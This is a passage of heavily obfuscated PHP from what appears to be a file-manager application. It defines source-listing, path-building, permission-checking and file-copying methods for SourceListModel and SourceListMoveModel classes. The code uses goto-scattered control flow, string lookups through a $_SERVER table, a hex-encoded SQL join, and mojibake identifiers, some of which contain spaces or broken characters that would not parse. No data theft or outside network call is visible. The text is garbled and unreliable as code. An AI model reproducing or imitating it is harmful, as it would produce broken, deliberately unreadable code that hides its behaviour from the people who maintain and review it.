$DÓ…Ëè¾­Ü[$F§·”Ò¤¦Ë[88]] = intval($Còé¹¦ŠÓ›[$DÓ…Ëè¾­Ü[$F§·”Ò¤¦Ë[2]] . $F§·”Ò¤¦Ë[89]][$F§·”Ò¤¦Ë[90]]); $DÓ…Ëè¾­Ü[$F§·”Ò¤¦Ë[91]] = intval($Còé¹¦ŠÓ›[$DÓ…Ëè¾­Ü[$F§·”Ò¤¦Ë[2]] . $F§·”Ò¤¦Ë[92]][$F§·”Ò¤¦Ë[90]]); } } goto B½æ†ËÂª†; CÅÄ¢•â§Ş: $F§·”Ò¤¦Ë =& $_SERVER[øü€åÏá™†Ôà]; $C±¸Ïš£ = $F§·”Ò¤¦Ë[85]; $Còé¹¦ŠÓ› = array(); goto cö¤é­Ì±Ó; cö¤é­Ì±Ó: $EˆŠùˆëšß = 1024 * 50; $EóöÎóˆƒ = count($Eù²–ä¡ĞŒ); $BµŠàæ—Ø = $this->tablePrefix . $this->tableName; goto CÛÈÜÕÙ˜; B½æ†ËÂª†: } protected function _listAppendAuth(&$FŸ–Ö§Æ) { goto CÚ¬™²œºÆ; CÚ¬™²œºÆ: $cÃµ÷öí« =& $_SERVER[øü€åÏá™†Ôà]; $D¢İõè¤ë = array(); foreach ($FŸ–Ö§Æ as $A³¤¬¡¦ƒŞ) { if ($A³¤¬¡¦ƒŞ[$cÃµ÷öí«[9]] == self::TYPE_GROUP) { $D¢İõè¤ë[] = $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[2]]; } } goto DÍ“á£¾Ñˆ; DÍ“á£¾Ñˆ: if (!$D¢İõè¤ë) { return; } $D´÷«İ¯±œ = array_to_keyvalue($FŸ–Ö§Æ, $cÃµ÷öí«[2]); $Bë½½¥³´• = Model($cÃµ÷öí«[93])->getSourceList($D¢İõè¤ë, $D´÷«İ¯±œ); goto EÆ¯÷ªõİ¾; EÆ¯÷ªõİ¾: foreach ($FŸ–Ö§Æ as $d†œéÕØë‰ => &$A³¤¬¡¦ƒŞ) { $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[16]] = $Bë½½¥³´•[$A³¤¬¡¦ƒŞ[$cÃµ÷öí«[2]]]; if (!$A³¤¬¡¦ƒŞ[$cÃµ÷öí«[16]] && $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[9]] == self::TYPE_GROUP) { $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[16]] = Action($cÃµ÷öí«[94])->pathGroupAuthMake($A³¤¬¡¦ƒŞ[$cÃµ÷öí«[95]]); if (!$A³¤¬¡¦ƒŞ[$cÃµ÷öí«[16]] && !$GLOBALS[$cÃµ÷öí«[96]]) { $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[97]] = !1; $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[98]] = !1; } } if ($A³¤¬¡¦ƒŞ[$cÃµ÷öí«[16]]) { $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[97]] = AuthModel::authCheckEdit($A³¤¬¡¦ƒŞ[$cÃµ÷öí«[16]][$cÃµ÷öí«[17]]); $A³¤¬¡¦ƒŞ[$cÃµ÷öí«[98]] = AuthModel::authCheckView($A³¤¬¡¦ƒŞ[$cÃµ÷öí«[16]][$cÃµ÷öí«[17]]); } $this->groupPathDisplay($A³¤¬¡¦ƒŞ); } goto bÉ–™‡ªæ; bÉ–™‡ªæ: } public function groupPathDisplay(&$A¼„Õ) { goto F††÷Õ¢¯İ; F÷ƒÇ®áÆ: $A¼„Õ[$E÷…¾‘İäÈ[105]] = $dñƒµ˜ç . $eƒã´–Ùª[$E÷…¾‘İäÈ[37]][$E÷…¾‘İäÈ[2]]; goto Aàîç”ŒØ; b‹ŒŠ¼ âç: $A¼„Õ[$E÷…¾‘İäÈ[101]] = $eƒã´–Ùª[$E÷…¾‘İäÈ[102]]; $A¼„Õ[$E÷…¾‘İäÈ[23]] = $eƒã´–Ùª[$E÷…¾‘İäÈ[100]]; $A¼„Õ[$E÷…¾‘İäÈ[103]] = $eƒã´–Ùª[$E÷…¾‘İäÈ[104]]; goto F÷ƒÇ®áÆ; F´æéÏ‡¾â: $Cë‹ñºÔÁ = $this->parentLevelArray($eƒã´–Ùª[$E÷…¾‘İäÈ[100]]); $dñƒµ˜ç = $E÷…¾‘İäÈ[1]; foreach ($Cë‹ñºÔÁ as $e’Ë—»¹á ) { $D£¹š‚õ¶Â = Model($E÷…¾‘İäÈ[99])->getInfo($e’Ë—»¹á ); $dñƒµ˜ç .= $D£¹š‚õ¶Â[$E÷…¾‘İäÈ[37]][$E÷…¾‘İäÈ[2]] . $E÷…¾‘İäÈ[15]; } goto b‹ŒŠ¼ âç; F††÷Õ¢¯İ: $E÷…¾‘İäÈ =& $_SERVER[øü€åÏá™†Ôà]; if ($A¼„Õ[$E÷…¾‘İäÈ[9]] != self::TYPE_GROUP) { return; } $eƒã´–Ùª = Model($E÷…¾‘İäÈ[99])->getInfo($A¼„Õ[$E÷…¾‘İäÈ[95]]); goto F´æéÏ‡¾â; Aàîç”ŒØ: } protected function _listAppendPath(&$EêÄä––ßñ) { goto Eô „ÜÑµ; aŠÍòÛ†´Ò: $e®·ÓÓ¡¼Ç = array(); foreach ($FéŠ¸Ú¹Æ as $d…¡‚öÊ => $e£†áŒÈµ) { if (!$e£†áŒÈµ) { $e®·ÓÓ¡¼Ç[] = $d…¡‚öÊ; } } if ($e®·ÓÓ¡¼Ç) { $B¡ø÷ùÄ• = array($EÂö«Ä¸î¶[26] => array($EÂö«Ä¸î¶[27], $e®·ÓÓ¡¼Ç)); if (count($e®·ÓÓ¡¼Ç) == 1) { $aéÔ‰Ñ¼Û = $this->sourceInfo($e®·ÓÓ¡¼Ç[0]); $aéÔ‰Ñ¼Û = is_array($aéÔ‰Ñ¼Û) ? array($aéÔ‰Ñ¼Û) : !1; } else { $aéÔ‰Ñ¼Û = $this->field($EÂö«Ä¸î¶[106])->where($B¡ø÷ùÄ•)->select(); } $d‚Ë†ÖÎ©£ = array_to_keyvalue($aéÔ‰Ñ¼Û, $EÂö«Ä¸î¶[2], $EÂö«Ä¸î¶[32]); $FéŠ¸Ú¹Æ = array_merge_index($FéŠ¸Ú¹Æ, $d‚Ë†ÖÎ©£); } goto a»»õñÅË²; Eô „ÜÑµ: $EÂö«Ä¸î¶ =& $_SERVER[øü€åÏá™†Ôà]; $FéŠ¸Ú¹Æ = array(); foreach ($EêÄä––ßñ as &$C Û–Ñçİ) { $FéŠ¸Ú¹Æ[$C Û–Ñçİ[$EÂö«Ä¸î¶[2]]] = $C Û–Ñçİ[$EÂö«Ä¸î¶[32]]; $bçíô‰ï”¤ = $this->parentLevelArray($C Û–Ñçİ[$EÂö«Ä¸î¶[100]]); array_shift($bçíô‰ï”¤); foreach ($bçíô‰ï”¤ as $Dì‘¿—æƒ) { if (!isset($FéŠ¸Ú¹Æ[$Dì‘¿—æƒ])) { $FéŠ¸Ú¹Æ[$Dì‘¿—æƒ] = 0; } } } goto aŠÍòÛ†´Ò; a»»õñÅË²: foreach ($EêÄä––ßñ as &$C Û–Ñçİ) { goto c¢¬¤×ñË; c¢¬¤×ñË: $bçíô‰ï”¤ = $this->parentLevelArray($C Û–Ñçİ[$EÂö«Ä¸î¶[100]]); $céœËå… = $this->_listAppendPathRoot($C Û–Ñçİ, $bçíô‰ï”¤); foreach ($bçíô‰ï”¤ as $Dì‘¿—æƒ) { if (isset($FéŠ¸Ú¹Æ[$Dì‘¿—æƒ])) { $céœËå… .= $FéŠ¸Ú¹Æ[$Dì‘¿—æƒ] . $EÂö«Ä¸î¶[107]; } } goto fºˆ–Ô¸Ã³; fºˆ–Ô¸Ã³: if ($bçíô‰ï”¤) { $céœËå… .= $C Û–Ñçİ[$EÂö«Ä¸î¶[32]]; } if ($C Û–Ñçİ[$EÂö«Ä¸î¶[6]]) { $céœËå… .= $EÂö«Ä¸î¶[107]; } $C Û–Ñçİ[$EÂö«Ä¸î¶[108]] = str_replace($EÂö«Ä¸î¶[109], $EÂö«Ä¸î¶[107], $céœËå…); goto AœòÚ—ˆŠí; AœòÚ—ˆŠí: $B˜¬ªˆ¯ßø = trim($C Û–Ñçİ[$EÂö«Ä¸î¶[108]], $EÂö«Ä¸î¶[107]); if ($C Û–Ñçİ[$EÂö«Ä¸î¶[102]] == $EÂö«Ä¸î¶[110] && $B˜¬ªˆ¯ßø) { $C Û–Ñçİ[$EÂö«Ä¸î¶[32]] = $B˜¬ªˆ¯ßø; } goto f˜‹µ—°Ì´; f˜‹µ—°Ì´: } goto DÔœéê¯Ø; DÔœéê¯Ø: } protected function _listAppendPathRoot(&$Fåøƒƒ‚Øå, $b¹¶·¢‚Ş¢) { $bÀ¶ÊÙ©Ô¿ =& $_SERVER[øü€åÏá™†Ôà]; $FŒ¬ˆé¨Çğ = $bÀ¶ÊÙ©Ô¿[1]; if ($Fåøƒƒ‚Øå[$bÀ¶ÊÙ©Ô¿[9]] == self::TYPE_USER) { if ($Fåøƒƒ‚Øå[$bÀ¶ÊÙ©Ô¿[95]] == USER_ID) { $FŒ¬ˆé¨Çğ = LNG($bÀ¶ÊÙ©Ô¿[111]); if (!$b¹¶·¢‚Ş¢) { $Fåøƒƒ‚Øå[$bÀ¶ÊÙ©Ô¿[32]] = $FŒ¬ˆé¨Çğ; } } else { $A¦áœËê” = Model($bÀ¶ÊÙ©Ô¿[112])->getInfoSimple($Fåøƒƒ‚Øå[$bÀ¶ÊÙ©Ô¿[95]]); $FŒ¬ˆé¨Çğ = $bÀ¶ÊÙ©Ô¿[113] . $A¦áœËê”[$bÀ¶ÊÙ©Ô¿[32]] . $bÀ¶ÊÙ©Ô¿[114]; } } else { if ($Fåøƒƒ‚Øå[$bÀ¶ÊÙ©Ô¿[9]] == self::TYPE_GROUP) { $A¦áœËê” = Model($bÀ¶ÊÙ©Ô¿[99])->getInfoSimple($Fåøƒƒ‚Øå[$bÀ¶ÊÙ©Ô¿[95]]); $FŒ¬ˆé¨Çğ = $A¦áœËê”[$bÀ¶ÊÙ©Ô¿[32]]; } else { if ($Fåøƒƒ‚Øå[$bÀ¶ÊÙ©Ô¿[9]] == self::TYPE_SYSTEM) { $A¦áœËê” = $this->sourceInfo($b¹¶·¢‚Ş¢[0], !0); $FŒ¬ˆé¨Çğ = $A¦áœËê”[$bÀ¶ÊÙ©Ô¿[32]]; } } } $FŒ¬ˆé¨Çğ = $FŒ¬ˆé¨Çğ ? $bÀ¶ÊÙ©Ô¿[107] . $FŒ¬ˆé¨Çğ . $bÀ¶ÊÙ©Ô¿[107] : $bÀ¶ÊÙ©Ô¿[107]; return $FŒ¬ˆé¨Çğ; } protected function _listAppendUser(&$c©²Á‘·©ƒ) { $Bå£ÑöÏÊŞ =& $_SERVER[øü€åÏá™†Ôà]; $C¯Šºõ® = array_to_keyvalue($c©²Á‘·©ƒ, $Bå£ÑöÏÊŞ[1], $Bå£ÑöÏÊŞ[20]); $FÅÆ¡ô²ìÜ = array_to_keyvalue($c©²Á‘·©ƒ, $Bå£ÑöÏÊŞ[1], $Bå£ÑöÏÊŞ[21]); $A¸Õ…µÛËè = array_merge($C¯Šºõ®, $FÅÆ¡ô²ìÜ); $a°Ÿ³³¨ò¢ = Model($Bå£ÑöÏÊŞ[115])->userListInfo($A¸Õ…µÛËè); foreach ($c©²Á‘·©ƒ as &$C‘“„ááè“) { $a‹´òœéœ = $C‘“„ááè“[$Bå£ÑöÏÊŞ[20]]; $C‘“„ááè“[$Bå£ÑöÏÊŞ[20]] = $a°Ÿ³³¨ò¢[$a‹´òœéœ] ? $a°Ÿ³³¨ò¢[$a‹´òœéœ] : !1; $a‹´òœéœ = $C‘“„ááè“[$Bå£ÑöÏÊŞ[21]]; $C‘“„ááè“[$Bå£ÑöÏÊŞ[21]] = $a°Ÿ³³¨ò¢[$a‹´òœéœ] ? $a°Ÿ³³¨ò¢[$a‹´òœéœ] : !1; if ($C‘“„ááè“[$Bå£ÑöÏÊŞ[62]] && $C‘“„ááè“[$Bå£ÑöÏÊŞ[62]][$Bå£ÑöÏÊŞ[116]]) { $C»àŒË–‰Û = $GLOBALS[$Bå£ÑöÏÊŞ[117]][$Bå£ÑöÏÊŞ[118]][$Bå£ÑöÏÊŞ[119]]; if ($C‘“„ááè“[$Bå£ÑöÏÊŞ[62]][$Bå£ÑöÏÊŞ[120]] <= time() - $C»àŒË–‰Û) { $this->metaSet($C‘“„ááè“[$Bå£ÑöÏÊŞ[2]], $Bå£ÑöÏÊŞ[116], null); $this->metaSet($C‘“„ááè“[$Bå£ÑöÏÊŞ[2]], $Bå£ÑöÏÊŞ[120], null); unset($C‘“„ááè“[$Bå£ÑöÏÊŞ[62]][$Bå£ÑöÏÊŞ[116]]); continue; } $FÑ èóí‘¯ = $C‘“„ááè“[$Bå£ÑöÏÊŞ[62]][$Bå£ÑöÏÊŞ[116]]; $C‘“„ááè“[$Bå£ÑöÏÊŞ[62]][$Bå£ÑöÏÊŞ[121]] = Model($Bå£ÑöÏÊŞ[115])->getInfoSimpleOuter($FÑ èóí‘¯); } } } public function parentLevelArray($d‰ŸñÀ¥¢) { $cã„ƒ±¨â– =& $_SERVER[øü€åÏá™†Ôà]; $d‰ŸñÀ¥¢ = explode($cã„ƒ±¨â–[15], trim($d‰ŸñÀ¥¢, $cã„ƒ±¨â–[15])); return array_remove_value($d‰ŸñÀ¥¢, $cã„ƒ±¨â–[110]); } public function listAll($AÆ×¯¼âì‰) { goto a§Æ…Òß‰; c¾©À‚Ğ’÷: $A¯å‚»íã˜ = array_to_keyvalue($A¯å‚»íã˜, $fË×”Ø–‹â[2]); $bæ›é¥íİ¹ = "\57{$BÍÇœÃ•[$fË×”Ø–‹â[32]]}\57"; $bæ›é¥íİ¹ = $bæ›é¥íİ¹ == $fË×”Ø–‹â[109] ? $fË×”Ø–‹â[107] : $bæ›é¥íİ¹; goto F«í²ÇÂÃ; a§Æ…Òß‰: $fË×”Ø–‹â =& $_SERVER[øü€åÏá™†Ôà]; $BÍÇœÃ• = $this->sourceInfo($AÆ×¯¼âì‰); $Aƒ•å‰ĞÄ = array($fË×”Ø–‹â[122] => array($fË×”Ø–‹â[123], $BÍÇœÃ•[$fË×”Ø–‹â[100]] . $AÆ×¯¼âì‰ . $fË×”Ø–‹â[124]), $fË×”Ø–‹â[125] => 0); goto C†’Œóàõì; F«í²ÇÂÃ: $CëÂ¾ƒ©·÷ = array(); foreach ($A¯å‚»íã˜ as $f«ÇƒšÈã’ => $aÓºÔ×ÌŞ) { goto eÅÓ£î”½—; fØ£‡”Ì×Ó: if (!$aÓºÔ×ÌŞ[$fË×”Ø–‹â[6]]) { $DõÔ¥ÔÅ‡¼[$fË×”Ø–‹â[129]] = $aÓºÔ×ÌŞ[$fË×”Ø–‹â[129]]; $DõÔ¥ÔÅ‡¼[$fË×”Ø–‹â[130]] = $aÓºÔ×ÌŞ[$fË×”Ø–‹â[4]]; } $CëÂ¾ƒ©·÷[] = $DõÔ¥ÔÅ‡¼; goto Böˆ‚Ò°†; eÅÓ£î”½—: $aÛƒÃÆ˜­º = $this->parentLevelArray($aÓºÔ×ÌŞ[$fË×”Ø–‹â[100]]); array_shift($aÛƒÃÆ˜­º); $D¨µĞ‚×Ì = $bæ›é¥íİ¹; goto FëÚöŞ±‡ó; Bë‰­éÖµ×: $D¨µĞ‚×Ì = str_replace($fË×”Ø–‹â[109], $fË×”Ø–‹â[107], $D¨µĞ‚×Ì); $D¨µĞ‚×Ì = str_replace($fË×”Ø–‹â[109], $fË×”Ø–‹â[107], $D¨µĞ‚×Ì); $DõÔ¥ÔÅ‡¼ = array($fË×”Ø–‹â[33] => str_replace($fË×”Ø–‹â[109], $fË×”Ø–‹â[107], $D¨µĞ‚×Ì), $fË×”Ø–‹â[128] => intval($aÓºÔ×ÌŞ[$fË×”Ø–‹â[6]]), $fË×”Ø–‹â[37] => $this->pathInfoFilter($aÓºÔ×ÌŞ, !0)); goto fØ£‡”Ì×Ó; FëÚöŞ±‡ó: for ($EÇšêÊŞÒë = 0; $EÇšêÊŞÒë < count($aÛƒÃÆ˜­º); $EÇšêÊŞÒë++) { $D¨µĞ‚×Ì .= $A¯å‚»íã˜[$aÛƒÃÆ˜­º[$EÇšêÊŞÒë]][$fË×”Ø–‹â[32]] . $fË×”Ø–‹â[107]; } $D¨µĞ‚×Ì .= $aÓºÔ×ÌŞ[$fË×”Ø–‹â[32]]; if ($aÓºÔ×ÌŞ[$fË×”Ø–‹â[6]]) { $D¨µĞ‚×Ì .= $fË×”Ø–‹â[107]; } goto Bë‰­éÖµ×; Böˆ‚Ò°†: } return $CëÂ¾ƒ©·÷; goto f°”‹Ğáš; C†’Œóàõì: $f²‚åºàÒŠ = $fË×”Ø–‹â[126]; $cÃòĞ—†ñÉ = "\x4c\x45\106\x54\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x66\151\154\145\40\146\x69\154\145\x20\157\x6e\40\x73\x6f\x75\162\x63\x65\56\x66\151\154\145\x49\104\40\75\40\x66\x69\154\x65\56\146\x69\x6c\145\x49\104"; $A¯å‚»íã˜ = $this->alias($fË×”Ø–‹â[127])->field($f²‚åºàÒŠ)->where($Aƒ•å‰ĞÄ)->join($cÃòĞ—†ñÉ)->select(); goto AãŸ¯æÓÛ; AãŸ¯æÓÛ: $this->_listAppendAuth($A¯å‚»íã˜); $this->_listAppendUser($A¯å‚»íã˜); $this->_listAppendPath($A¯å‚»íã˜); goto c¾©À‚Ğ’÷; f°”‹Ğáš: } } class SourceListMoveModel extends SourceListModel { public function isParentOf($F´È˜³Ã÷«, $cÊ†˜óŠàƒ) { goto C§Ñ¼°ĞÍ; C§Ñ¼°ĞÍ: $c°¸‚ä†Í¥ =& $_SERVER[°Óó£ÌİóèÅ]; $F½¯ø·Àõ• = $this->sourceInfo($F´È˜³Ã÷«); $a‡º„ä–İµ = $this->sourceInfo($cÊ†˜óŠàƒ); goto bÔ®½Ò¾œÍ; A–åÓ°Á²Ú: return $cÑ•½—µİ‚; goto Fˆé£Æ¿åŠ; bÔ®½Ò¾œÍ: $DÓ¥­ÆÛšÚ = $F½¯ø·Àõ•[$c°¸‚ä†Í¥[381]] . $F½¯ø·Àõ•[$c°¸‚ä†Í¥[382]] . $c°¸‚ä†Í¥[47]; $c¹ÈË¦½” = $a‡º„ä–İµ[$c°¸‚ä†Í¥[381]] . $a‡º„ä–İµ[$c°¸‚ä†Í¥[382]] . $c°¸‚ä†Í¥[47]; $cÑ•½—µİ‚ = strpos($c¹ÈË¦½”, $DÓ¥­ÆÛšÚ) === 0; goto A–åÓ°Á²Ú; Fˆé£Æ¿åŠ: } public function copy($c„½š¿Ò—, $eÕëÒèµ”Ÿ, $cïÍ—ØÇĞô = REPEAT_REPLACE, $F¬×Ïì÷«Â = '') { goto c§Á½»‹Š; E‡ÖâÎ‚…ó: $cÒ¦¯ÛÖäÌ = $this->fileNameExistCache($eÕëÒèµ”Ÿ, $BğõÁ¬¼£[$EáØĞ¡§ß²[28]]); $dá„¨ÎˆÇ = $this->_copy($c„½š¿Ò—, $eÕëÒèµ”Ÿ, $cïÍ—ØÇĞô, $AÀáäÖŒ°, !0, $F¬×Ïì÷«Â); $this->_childrenListClear(); goto E÷éÓ®ò; a”ÔÜö¹æå: if (!$BğõÁ¬¼£ || !$D¨Ñ–è || $D¨Ñ–è[$EáØĞ¡§ß²[383]] != $EáØĞ¡§ß²[384]) { return !1; } if ($this->isParentOf($c„½š¿Ò—, $eÕëÒèµ”Ÿ)) { return !1; } $AÀáäÖŒ° = array($EáØĞ¡§ß²[385] => array(), $EáØĞ¡§ß²[386] => array(), $EáØĞ¡§ß²[387] => array()); goto E‡ÖâÎ‚…ó; fˆ—…’À: $this->updateModifyTime($eÕëÒèµ”Ÿ); return $dá„¨ÎˆÇ; goto b†ñ¼¾ÄÚÖ; c§Á½»‹Š: $EáØĞ¡§ß² =& $_SERVER[°Óó£ÌİóèÅ]; $BğõÁ¬¼£ = $this->sourceInfo($c„½š¿Ò—); $D¨Ñ–è = $this->sourceInfo($eÕëÒèµ”Ÿ); goto a”ÔÜö¹æå; DÆ‡êÊŒ°‚: $this->saveAll($AÀáäÖŒ°[$EáØĞ¡§ß²[387]]); Model($EáØĞ¡§ß²[172])->linkAdd($AÀáäÖŒ°[$EáØĞ¡§ß²[385]]); $this->folderSizeReset($eÕëÒèµ”Ÿ); goto fˆ—…’À; E÷éÓ®ò: if ($BğõÁ¬¼£[$EáØĞ¡§ß²[383]] == $EáØĞ¡§ß²[384] && $cÒ¦¯ÛÖäÌ == $dá„¨ÎˆÇ) { $this->folderSizeResetChildren($cÒ¦¯ÛÖäÌ); } Model($EáØĞ¡§ß²[388])->addAll($AÀáäÖŒ°[$EáØĞ¡§ß²[386]], array(), !0); Model($EáØĞ¡§ß²[389])->eventCopy($dá„¨ÎˆÇ); goto DÆ‡êÊŒ°‚; b†ñ¼¾ÄÚÖ: } private function _copy($DÁŞœÍí„Ô, $eÒÊöåª¼ë, $C¦‚õİ‚ì, &$cÑÜ÷ğíõ , $Bõöî¶†è, $f‹Õ„§Öº = '') { goto AÁ¦‚…¡·™; AÁ¦‚…¡·™: $AÌÙŠ÷çª‹ =& $_SERVER[°Óó£ÌİóèÅ]; $b¦ËÖ‰°³© = $this->sourceInfoCache($DÁŞœÍí„Ô); $eª©Çí°¡÷ = $b¦ËÖ‰°³©[$AÌÙŠ÷çª‹[383]] == $AÌÙŠ÷çª‹[384]; goto C¸Ô¹ø»½ˆ; C¸Ô¹ø»½ˆ: $BĞµ³†Œ© = $f‹Õ„§Öº ? $f‹Õ„§Öº : $b¦ËÖ‰°³©[$AÌÙŠ÷çª‹[28]]; $E÷ñŠ„‹Â = $this->fileNameExistCache($eÒÊöåª¼ë, $BĞµ³†Œ©); if ($Bõöî¶†è) { $this->_childrenAllMake($DÁŞœÍí„Ô); if ($eª©Çí°¡÷ && $E÷ñŠ„‹Â) { $this->_childrenAllMake($E÷ñŠ„‹Â); } } goto eå†ßôÎ÷; eå†ßôÎ÷: if (!$E÷ñŠ„‹Â) { return $this->_copyCreate($DÁŞœÍí„Ô, $eÒÊöåª¼ë, $BĞµ³†Œ©, $cÑÜ÷ğíõ ); } $B¢‚Šœ‡‘ª = $E÷ñŠ„‹Â; if ($eª©Çí°¡÷) { if ($C¦‚õİ‚ì == REPEAT_RENAME_FOLDER) { $BĞµ³†Œ© = $this->fileNameAutoCache($eÒÊöåª¼ë, $BĞµ³†Œ©, $C¦‚õİ‚ì, $eª©Çí°¡÷); $B¢‚Šœ‡‘ª = $this->_copyCreate($DÁŞœÍí„Ô, $eÒÊöåª¼ë, $BĞµ³†Œ©, $cÑÜ÷ğíõ ); } else { $cÃ‡Üõ‰ = $this->_childrenList($DÁŞœÍí„Ô); foreach ($cÃ‡Üõ‰ as $C§—¾ì´·³) { $this->_copy($C§—¾ì´·³[$AÌÙŠ÷çª‹[382]], $E÷ñŠ„‹Â, $C¦‚õİ‚ì, $cÑÜ÷ğíõ , !1); } } } else { if ($C¦‚õİ‚ì == REPEAT_RENAME || $C¦‚õİ‚ì == REPEAT_RENAME_FOLDER) { $BĞµ³†Œ© = $this->fileNameAutoCache($eÒÊöåª¼ë, $BĞµ³†Œ©, $C¦‚õİ‚ì, $eª©Çí°¡÷); $B¢‚Šœ‡‘ª = $this->_copyCreate($DÁŞœÍí„Ô, $eÒÊöåª¼ë, $BĞµ³†Œ©, $cÑÜ÷ğíõ ); } else { if ($C¦‚õİ‚ì == REPEAT_REPLACE) { $cÁªÜŒ‡äá = $this->sourceInfoCache($E÷ñŠ„‹Â); $c«Ø†É²¯Æ = $this->fileHistory($cÁªÜŒ‡äá, $b¦ËÖ‰°³©[$AÌÙŠ÷çª‹[390]], $b¦ËÖ‰°³©[$AÌÙŠ÷çª‹[86]]); if ($c«Ø†É²¯Æ) { $cÑÜ÷ğíõ [$AÌÙŠ÷çª‹[385]][] = $b¦ËÖ‰°³©[$AÌÙŠ÷çª‹[390]]; } } else { if ($C¦‚õİ‚ì == REPEAT_SKIP) { } } } } goto dëá ”Ç; dëá ”Ç: return $B¢‚Šœ‡‘ª; goto c¯‹©ã÷¤§; c¯‹©ã÷¤§: } private function _copyCreate($cğ•ÛªÍ»», $BèÛ‰¾ÙÕã, $bäÌ³Ë³Œ, &$eßÓà§×Ö) { goto D‚¸‹‚ŸØ™; Bšµ¿Ê»Î”: $EÖ­­Ï—Ò× = $this->_makeItemData($C˜¯¤µ¿«ª, $fòÚÊŒ”Í, $bäÌ³Ë³Œ); Hook::trigger($Eø§ƒ–Õá×[391], $EÖ­­Ï—Ò×); $Aà®É‚ë‹á = $this->add($EÖ­­Ï—Ò×); goto c¿Óº‘·†Ø; bè¨“…œâŸ: $c»‚ÕÖ’©İ = array(); $báÁ´¿Î½· = array(); $this->_childrenListAll($cğ•ÛªÍ»», $c»‚ÕÖ’©İ); goto b²ù„®ÁÍä; FÀÒ¢éøØ…: $B“‹Ã°½Ô[$cğ•ÛªÍ»»] = $Aà®É‚ë‹á; $AŸÆĞŠÀÇ = array(); $E®°šš®Ãë = array(); goto CÖ²¯°à™ñ; b²ù„®ÁÍä: if (count($c»‚ÕÖ’©İ) == 0) { return $Aà®É‚ë‹á; } $aÀ¿ŞÌ×Ú» = $this->sourceInfo($Aà®É‚ë‹á); foreach ($c»‚ÕÖ’©İ as $BÂ‡èÈØÅ¥) { $a¶ˆ„Å‡È´ = $this->_makeItemData($BÂ‡èÈØÅ¥, $aÀ¿ŞÌ×Ú», $BÂ‡èÈØÅ¥[$Eø§ƒ–Õá×[28]]); $a¶ˆ„Å‡È´[$Eø§ƒ–Õá×[381]] = $BÂ‡èÈØÅ¥[$Eø§ƒ–Õá×[381]]; $báÁ´¿Î½·[] = $a¶ˆ„Å‡È´; } goto Cí¡òóô; Cí¡òóô: $this->addAll($báÁ´¿Î½·); $E¬åß˜Õ = $this->where(array($Eø§ƒ–Õá×[392] => $Aà®É‚ë‹á))->select(); $B“‹Ã°½Ô = $this->_childrenMakeRelation($c»‚ÕÖ’©İ, $E¬åß˜Õ); goto FÀÒ¢éøØ…; D¬îõŞÛ³: return $Aà®É‚ë‹á; goto C›³³Ñô; D‚¸‹‚ŸØ™: $Eø§ƒ–Õá× =& $_SERVER[°Óó£ÌİóèÅ]; $C˜¯¤µ¿«ª = $this->sourceInfoCache($cğ•ÛªÍ»»); $fòÚÊŒ”Í = $this->sourceInfoCache($BèÛ‰¾ÙÕã); goto Bšµ¿Ê»Î”; c¿Óº‘·†Ø: $f±÷°œÕ– = array($Eø§ƒ–Õá×[382] => $Aà®É‚ë‹á, $Eø§ƒ–Õá×[28] => $bäÌ³Ë³Œ); $this->_copyApplyMeta($f±÷°œÕ–, $eßÓà§×Ö); if ($C˜¯¤µ¿«ª[$Eø§ƒ–Õá×[383]] != $Eø§ƒ–Õá×[384]) { $eßÓà§×Ö[$Eø§ƒ–Õá×[385]][] = $C˜¯¤µ¿«ª[$Eø§ƒ–Õá×[390]]; return $Aà®É‚ë‹á; } goto bè¨“…œâŸ; CÖ²¯°à™ñ: foreach ($E¬åß˜Õ as $BÂ‡èÈØÅ¥) { $Díš¥„Ÿ‹Í = $BÂ‡èÈØÅ¥[$Eø§ƒ–Õá×[382]]; $eµ‹ÍÁÄñ = $this->_childrenMatch($B“‹Ã°½Ô, $BÂ‡èÈØÅ¥, $aÀ¿ŞÌ×Ú»); $AŸÆĞŠÀÇ[] = array($Eø§ƒ–Õá×[382], $Díš¥„Ÿ‹Í, $Eø§ƒ–Õá×[392], $eµ‹ÍÁÄñ[$Eø§ƒ–Õá×[392]]); $E®°šš®Ãë[] = array($Eø§ƒ–Õá×[382], $Díš¥„Ÿ‹Í, $Eø§ƒ–Õá×[381], $eµ‹ÍÁÄñ[$Eø§ƒ–Õá×[381]]); $this->_copyApplyMeta($BÂ‡èÈØÅ¥, $eßÓà§×Ö); if ($BÂ‡èÈØÅ¥[$Eø§ƒ–Õá×[383]] != $Eø§ƒ–Õá×[384]) { $eßÓà§×Ö[$Eø§ƒ–Õá×[385]][] = $BÂ‡èÈØÅ¥[$Eø§ƒ–Õá×[390]]; } } $this->saveAll($AŸÆĞŠÀÇ); $this->saveAll($E®°šš®Ãë); goto D¬îõŞÛ³; C›³³Ñô: } private function _childrenMakeRelation($aÎÑÍöŞ‡™, $E¥”é–š†§) { $cÀ øÍê¸± =& $_SERVER[°Óó£ÌİóèÅ]; $E‹İ¸íÉß = array(); $a°â£ÄÚÂÜ = array(); foreach ($aÎÑÍöŞ‡™ as $Eİ××âƒÁ¡) { $Cñ•Ş‹ŞÆØ = $Eİ××âƒÁ¡[$cÀ øÍê¸±[28]] . $cÀ øÍê¸±[8] . $Eİ××âƒÁ¡[$cÀ øÍê¸±[381]]; $E‹İ¸íÉß[$Cñ•Ş‹ŞÆØ] = $Eİ××âƒÁ¡[$cÀ øÍê¸±[382]]; } foreach ($E¥”é–š†§ as $Eİ××âƒÁ¡) { $Cñ•Ş‹ŞÆØ = $Eİ××âƒÁ¡[$cÀ øÍê¸±[28]] . $cÀ øÍê¸±[8] . $Eİ××âƒÁ¡[$cÀ øÍê¸±[381]]; $Aô’´×ß¢™ = $E‹İ¸íÉß[$Cñ•Ş‹ŞÆØ]; $a°â£ÄÚÂÜ[$Aô’´×ß¢™] = $Eİ××âƒÁ¡[$cÀ øÍê¸±[382]]; } return $a°â£ÄÚÂÜ; } private function _childrenMatch($c±äÔÁ“Ó , $E‡ÏÆô¥‹, $dÀ‚ß”¨æ) { goto d´Şªõ¤; d´Şªõ¤: $DÄ„®¨…ô =& $_SERVER[°Óó£ÌİóèÅ]; $A¾À ¸ñ  = 